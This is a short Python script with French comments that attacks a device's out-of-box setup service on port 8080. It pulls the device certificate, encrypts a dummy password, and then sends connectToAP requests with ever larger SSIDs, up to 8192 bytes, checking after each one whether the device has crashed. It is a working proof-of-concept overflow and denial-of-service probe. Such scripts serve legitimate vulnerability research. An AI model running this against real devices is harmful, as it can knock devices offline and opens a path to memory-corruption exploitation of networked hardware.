import json, socket, subprocess, tempfile, os, sys, time, urllib.request
DEV="10.201.126.241"
def post(p, tmo=25):
    r=urllib.request.Request(f"http://{DEV}:8080/OOBE",
        data=json.dumps(p,separators=(",",":")).encode(),
        headers={"Content-Type":"application/x-thrift"})
    try:
        return urllib.request.urlopen(r,timeout=tmo).read()
    except urllib.error.HTTPError as e:
        return f"HTTP{e.code}".encode()
def alive():
    try: s=socket.create_connection((DEV,8080),timeout=3); s.close(); return True
    except: return False
# 1. cert
d=json.loads(post([1,"getDeviceDetails",1,1,{}]))
pem=d[4]["0"]["rec"]["5"]["rec"]["1"]["str"]
open("/tmp/c.pem","w").write(pem)
print("cert OK", len(pem))
# 2. chiffre un mot de passe
enc=subprocess.run(["openssl","smime","-encrypt","-aes256","-binary","-outform","PEM","/tmp/c.pem"],
                   input=b"password12345", capture_output=True).stdout.decode()
print("password chiffre:", len(enc))
# 3. connectToAP avec SSID de plus en plus gros
for n in [32, 256, 1024, 4096, 8192]:
    ssid="S"*n
    p=[1,"connectToAP",1,1,{"1":{"rec":{"1":{"str":ssid},"2":{"i32":3},"3":{"rec":{"1":{"str":enc}}}}}}]
    r=post(p)
    ok=alive()
    print(f"  SSID len={n:5} -> {r[:60]!r}  alive={ok}")
    if not ok:
        print(f"  ★★★ MORT avec SSID de {n}"); break
    time.sleep(1)
